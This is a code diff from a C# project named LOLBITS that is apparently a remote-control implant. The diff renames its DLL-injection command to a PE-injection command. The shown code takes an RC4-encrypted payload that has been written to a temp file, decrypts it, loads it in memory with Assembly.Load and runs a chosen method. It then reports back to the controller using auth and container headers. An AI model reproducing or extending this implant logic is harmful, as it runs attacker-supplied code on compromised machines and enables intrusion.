@@ -120,7 +120,7 @@ namespace LOLBITS.Controlling
             {
                 switch (file.Commands[0])
                 {
-                    case "inject_dll":
+                    case "inject_pe":
                         {
                             var fileP = _tempPath + @"\" + _id;
                             var headers = "reqId: " + _auth + "\r\ncontid: " + ContId;
@@ -129,7 +129,7 @@ namespace LOLBITS.Controlling
                             {
                                 try
                                 {
-                                    var dll = LoadDll(fileP);
+                                    var pe = LoadPE(fileP);
                                     var method = file.Commands[1];
                                     var args = "";
 
@@ -142,8 +142,8 @@ namespace LOLBITS.Controlling
 
                                     var arguments = new string[] { args };
 
-                                    LauncherDll.Main(method, arguments, dll);
-                                    rps = "Dll injected!";
+                                    LauncherPE.Main(method, arguments, pe);
+                                    rps = "PE injected!";
                                 }
                                 catch (Exception)
                                 {
@@ -425,7 +425,7 @@ namespace LOLBITS.Controlling
             }
         }
 
-        private Assembly LoadDll(string filePath)
+        private Assembly LoadPE(string filePath)
         {
             var fileStr = File.ReadAllText(filePath);
             var xKey = Encoding.ASCII.GetBytes(_p);
@@ -433,9 +433,9 @@ namespace LOLBITS.Controlling
             var contentEncrypted = StringHexToByteArray.Convert(hexadecimal);
             var contentDecrypted = Rc4.Decrypt(xKey, contentEncrypted);
 
-            var dll = Assembly.Load(contentDecrypted);
+            var pe = Assembly.Load(contentDecrypted);
 
-            return dll;
+            return pe;
         }
     }
 }
